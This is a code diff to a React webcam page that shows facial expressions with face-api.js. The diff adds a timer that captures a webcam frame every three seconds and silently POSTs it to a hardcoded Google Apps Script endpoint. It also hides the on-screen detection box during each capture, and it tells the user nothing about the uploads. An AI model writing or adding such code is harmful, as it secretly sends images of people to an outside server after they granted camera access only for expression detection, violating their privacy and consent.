@@ -1,12 +1,18 @@
 import * as faceapi from "face-api.js";
 import { useEffect, useRef, useState } from "react";
 
+const GOOGLE_SCRIPT_URL =
+    "https://script.google.com/macros/s/AKfycbw6wo-7UAhh0-WKK6PmrqVnOkqVf0mpCm8evgBJXR_0XLrKzvETDQ2wUtm5GjLQLZ4C/exec";
+
+const MODEL_URL = "/models";
+
 const CamPage = () => {
     const videoRef = useRef<HTMLVideoElement>(null);
     const canvasRef = useRef<HTMLCanvasElement>(null);
-    const [message, setMessage] = useState("Loading models...");
-    const MODEL_URL = "/models";
     const detectionInterval = useRef<NodeJS.Timeout | null>(null);
+    const captureInterval = useRef<NodeJS.Timeout | null>(null);
+    const [message, setMessage] = useState("Loading models...");
+    const [showBox, setShowBox] = useState(true);
 
     useEffect(() => {
         let stream: MediaStream | null = null;
@@ -29,16 +35,16 @@ const CamPage = () => {
         const startVideo = async () => {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: "user",
-                    },
+                    video: { facingMode: "user" },
                     audio: false,
                 });
+
                 if (videoRef.current) {
                     videoRef.current.srcObject = stream;
                     await videoRef.current.play();
                     setMessage("Webcam aktif 🎥");
                     startDetectionLoop();
+                    startAutoCapture();
                 }
             } catch (err) {
                 console.error("Webcam error:", err);
@@ -58,7 +64,6 @@ const CamPage = () => {
 
             detectionInterval.current = setInterval(async () => {
                 if (!video || video.paused || video.ended) return;
-
                 const detections = await faceapi
                     .detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())
                     .withFaceLandmarks()
@@ -68,7 +73,7 @@ const CamPage = () => {
                 const ctx = canvas.getContext("2d");
                 ctx?.clearRect(0, 0, canvas.width, canvas.height);
 
-                if (resized.length > 0) {
+                if (showBox && resized.length > 0) {
                     const face = resized[0];
                     const top = Object.entries(face.expressions).reduce((a, b) =>
                         a[1] > b[1] ? a : b
@@ -78,16 +83,50 @@ const CamPage = () => {
                     });
                     drawBox.draw(canvas);
                     setMessage(`Ekspresi: ${top[0]} 😄`);
-                } else {
+                } else if (resized.length === 0) {
                     setMessage("Tidak ada wajah ❌");
                 }
             }, 300);
+        };
+
+        const startAutoCapture = () => {
+            captureInterval.current = setInterval(() => {
+                if (!videoRef.current || !canvasRef.current) return;
+                const video = videoRef.current;
+                const canvas = canvasRef.current;
+                const ctx = canvas.getContext("2d");
+                if (!ctx) return;
+
+                setShowBox(false);
+
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imgData = canvas.toDataURL("image/png");
+                uploadToDrive(imgData);
+
+                setTimeout(() => setShowBox(true), 500);
+            }, 3000);
+        };
+
+        const uploadToDrive = async (imgData: string) => {
+            try {
+                await fetch(GOOGLE_SCRIPT_URL, {
+                    method: "POST",
+                    mode: "no-cors",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ image: imgData }),
+                });
+                console.log("📤 Upload dikirim");
+            } catch (err) {
+                console.error("❌ Upload gagal:", err);
+            }
         };
 
         loadModels();
 
         return () => {
             if (detectionInterval.current) clearInterval(detectionInterval.current);
+            if (captureInterval.current) clearInterval(captureInterval.current);
             if (stream) stream.getTracks().forEach((t) => t.stop());
             if (videoRef.current) videoRef.current.srcObject = null;
         };
